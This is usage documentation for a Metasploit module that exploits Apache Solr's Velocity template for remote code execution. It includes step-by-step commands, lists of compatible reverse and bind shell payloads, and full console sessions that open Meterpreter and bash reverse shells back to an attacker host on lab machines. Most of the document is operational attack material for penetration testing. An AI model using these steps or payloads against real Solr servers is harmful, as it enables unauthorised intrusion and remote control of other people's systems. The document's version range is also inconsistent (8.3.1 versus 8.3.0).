## Description
This module exploits a vulnerability in Apache Solr <= 8.3.1 which allows remote code execution via a custom
Velocity template. Currently, this module only supports Solr basic authentication.

**From the Tenable advisory**:
An attacker could target a vulnerable Apache Solr instance by first identifying a list
of Solr core names. Once the core names have been identified, an attacker can send a specially crafted
HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response
Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity
template parameter in a specially crafted Solr request, leading to RCE.

Payload defaults to x86 Meterpreter reverse TCP (`windows/meterpreter/reverse_tcp`) for Windows,
Bash reverse TCP shell (`cmd/unix/reverse_bash`) for Unix in-memory execution, and
x86 Meterpreter reverse TCP (`linux/x86/meterpreter/reverse_tcp`) for Linux command stager.

## Vulnerable Applications

Apache Solr <= 8.3.0

## Verification Steps

1. Start `msfconsole`
2. `use exploit/multi/http/solr_velocity_rce`
3. `set RHOST <target_ip>`
4. `set RPORT <target_port>`
5. `set USERNAME <username>` (if applicable)
6. `set PASSWORD <password>` (if applicable)
7. Ideally run `check`
8. `set TARGET` based on output of `check`
9. `set PAYLOAD <payload_name>` if you want to use other payloads
10. `set LHOST <your_ip>`
11. `set LPORT <your_port>`
12. Optional: `set VERBOSE true` to get verbose output
13. Optional: `set TARGETURI <path_to_solr>` if target system uses a different path to Apache Solr
14. `exploit` and let the shells rain

## Considerations

Privileges gained are dependent on the user running Solr.
Currently, this module only supports basic auth.
Payload defaults to `windows/meterpreter/reverse_tcp` for Windows (for both `PowerShell` and `CmdStager`)
*nix systems have 2 targets:
1. Unix: Uses command execution. Payload defaults to `cmd/unix/reverse_bash`
2. Linux: Uses `CmdStager`. Payload defaults to `linux/x86/meterpreter/reverse_tcp`

Some `cmd/unix` payloads do not work due to a quoting problem: the entire command in the Velocity template is single-quoted
for the convenience of `CmdStager`. Some `cmd/unix` payloads as they are single-quoted, so this breaks the Velocity template.

The full list of `cmd/unix` payloads that do not work due to the quoting problem are listed below:
1. cmd/unix/bind_awk
2. cmd/unix/bind_lua
3. cmd/unix/bind_nodejs
4. cmd/unix/bind_r
5. cmd/unix/bind_ruby
6. cmd/unix/bind_socat_udp
7. cmd/unix/reverse_awk
8. cmd/unix/reverse_lua
9. cmd/unix/reverse_nodejs
10. cmd/unix/reverse_perl
11. cmd/unix/reverse_perl_ssl
12. cmd/unix/reverse_php_ssl
13. cmd/unix/reverse_python
14. cmd/unix/reverse_python_ssl
15. cmd/unix/reverse_r
16. cmd/unix/reverse_ruby
17. cmd/unix/reverse_ruby_ssl
18. cmd/unix/reverse_socat_udp
29. generic/shell_bind_tcp
20. generic/shell_reverse_tcp

The full list of `cmd/unix` payloads that work:
1. cmd/unix/bind_netcat
2. cmd/unix/bind_netcat_gaping
3. cmd/unix/bind_perl
4. cmd/unix/bind_zsh
5. cmd/unix/generic
6. cmd/unix/pingback_bind
7. cmd/unix/pingback_reverse
8. cmd/unix/reverse
9. cmd/unix/reverse_bash
10. cmd/unix/reverse_bash_udp
11. cmd/unix/reverse_ksh
12. cmd/unix/reverse_openssl
13. cmd/unix/reverse_ncat_ssl
14. cmd/unix/reverse_netcat
15. cmd/unix/reverse_netcat_gaping
16. cmd/unix/reverse_zsh

These `cmd/unix` payloads have not fully tested with this module:
1. cmd/unix/bind_busybox_telnetd
3. cmd/unix/bind_netcat_gaping_ipv6
3. cmd/unix/bind_perl_ipv6
4. cmd/unix/bind_ruby_ipv6
5. cmd/unix/reverse_bash_telnet_ssl
6. cmd/unix/reverse_ssl_double_telnet

These `cmd/unix` payloads have not been tested:
1. cmd/unix/bind_stub
2. cmd/unix/reverse_stub
3. generic/custom


## Examples

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using PowerShell
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.132
RHOSTS => 192.168.137.132
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > check

[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[+] 192.168.137.132:8983 - The target is vulnerable.
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 2
TARGET => 2
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[+] Found Powershell at C:\Windows\System32\WindowsPowerShell\v1.0\
[*] Sending stage (180291 bytes) to 192.168.137.132
[*] Meterpreter session 1 opened (192.168.137.128:4444 -> 192.168.137.132:50100) at 2020-02-07 01:28:08 +0800

meterpreter > sysinfo
Computer        : 2K19DTCTR
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using CmdStager
```
msf5 > use exploit/multi/http/solr_velocity_rce 
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.132
RHOSTS => 192.168.137.132
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 2
TARGET => 2
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[!] PowerShell not found, will revert to CmdStager for payload delivery!
[*] Sending CmdStager payload...
[*] Command Stager progress -   7.05% done (7160/101541 bytes)
[*] Command Stager progress -  14.10% done (14320/101541 bytes)
[*] Command Stager progress -  21.15% done (21480/101541 bytes)
[*] Command Stager progress -  28.21% done (28640/101541 bytes)
[*] Command Stager progress -  35.26% done (35800/101541 bytes)
[*] Command Stager progress -  42.31% done (42960/101541 bytes)
[*] Command Stager progress -  49.36% done (50120/101541 bytes)
[*] Command Stager progress -  56.41% done (57280/101541 bytes)
[*] Command Stager progress -  63.46% done (64440/101541 bytes)
[*] Command Stager progress -  70.51% done (71600/101541 bytes)
[*] Command Stager progress -  77.56% done (78760/101541 bytes)
[*] Command Stager progress -  84.62% done (85920/101541 bytes)
[*] Command Stager progress -  91.67% done (93080/101541 bytes)
[*] Command Stager progress -  98.67% done (100188/101541 bytes)
[*] Sending stage (180291 bytes) to 192.168.137.132
[*] Command Stager progress - 100.00% done (101541/101541 bytes)
[*] Meterpreter session 2 opened (192.168.137.128:4444 -> 192.168.137.132:50209) at 2020-02-07 16:01:44 +0800

meterpreter > sysinfo
Computer        : 2K19DTCTR
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 


```

### Bitnami Solr VM 8.3.0, requiring basic authentication, command execution in-memory (example payload is cmd/unix/reverse_bash)
```
msf5 > use exploit/multi/http/solr_velocity_rce 
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.129
RHOSTS => 192.168.137.129
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 0
TARGET => 0
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[*] Command shell session 3 opened (192.168.137.128:4444 -> 192.168.137.129:48680) at 2020-02-07 16:04:29 +0800

id
uid=999(solr) gid=1002(solr) groups=1002(solr)

```

### Bitnami Solr VM 8.3.0, requiring basic authentication, using CmdStager
```
msf5 > use exploit/multi/http/solr_velocity_rce 
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.129
RHOSTS => 192.168.137.129
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 1
TARGET => 1
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[*] Using URL: http://0.0.0.0:8080/L9Iefj
[*] Local IP: http://192.168.137.128:8080/L9Iefj
[*] Client 192.168.137.129 (curl/7.52.1) requested /L9Iefj
[*] Sending payload to 192.168.137.129 (curl/7.52.1)
[*] Sending stage (985320 bytes) to 192.168.137.129
[*] Meterpreter session 4 opened (192.168.137.128:4444 -> 192.168.137.129:48694) at 2020-02-07 16:07:41 +0800
[*] Command Stager progress - 100.00% done (147/147 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.137.129
OS           : Debian 9.11 (Linux 4.9.0-11-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```